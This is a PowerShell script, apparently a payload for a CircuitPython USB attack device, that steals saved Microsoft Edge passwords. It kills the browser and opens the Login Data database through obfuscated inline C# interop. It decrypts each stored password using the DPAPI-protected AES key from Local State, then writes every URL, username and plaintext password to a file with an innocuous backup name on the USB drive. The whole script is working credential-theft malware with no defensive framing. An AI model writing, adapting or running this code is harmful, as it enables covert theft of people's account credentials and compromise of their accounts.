# Ensure USB drive is mounted and accessible (e.g., CIRCUITPY or another label)
$usbDrive = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot -like "*CIRCUITPY*" }

if (-not $usbDrive) {
    Write-Error "USB Drive not found. Please ensure the USB is connected."
    exit
}

# Define where to save the extracted data on the USB drive
$FilePath = "$($usbDrive.Root)Backup_DataMaster.txt"

# Edge Browser Login Data Path
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# Kill Edge to avoid file locks
Stop-Process -Name msedge -ErrorAction SilentlyContinue

# Setup decryption methods
$d = Add-Type -A System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$u = [Security.Cryptography.ProtectedData]

Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"

# Define path to login data and local state files
$loginDataPath = Join-Path $edgePath "Default\Login Data"
$localStatePath = Join-Path $edgePath "Local State"

# Check if login data exists
if (-Not (Test-Path $loginDataPath)) {
    Write-Error "Edge Login Data not found."
    exit
}

# Open Login Data DB
$s = [W]::O($loginDataPath, [ref]$d)
$l = @()

# Decrypt the AES key from the local state (if necessary)
$x = $null
if (Test-Path $localStatePath) {
    $b = (Get-Content $localStatePath | ConvertFrom-Json).os_crypt.encrypted_key
    $x = [Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.Length - 1)], $n, 0))
}

# Extract login data from the database
$_ = [W]::P($d, "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)

for (; !([W]::S($s) % 100);) {
    $url = [W]::T($s, 0)
    $user = [W]::T($s, 1)
    $enc = [W]::B($s, 2)

    try {
        $dec = $u::Unprotect($enc, $n, 0)
    } catch {
        if ($x) {
            $k = $enc.Length
            $dec = [byte[]]::new($k - 31)
            $x.Decrypt($enc[3..14], $enc[15..($k - 17)], $enc[($k - 16)..($k - 1)], $dec)
        }
    }

    $pass = ($dec | ForEach-Object { [char]$_ }) -join ''
    $l += "`nBrowser: Edge`nURL: $url`nUsername: $user`nPassword: $pass`n`n"
}

# Save the extracted data to USB
$l | Out-File -Encoding ASCII -FilePath $FilePath -Force

# Optionally, restart the browser
Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue

exit
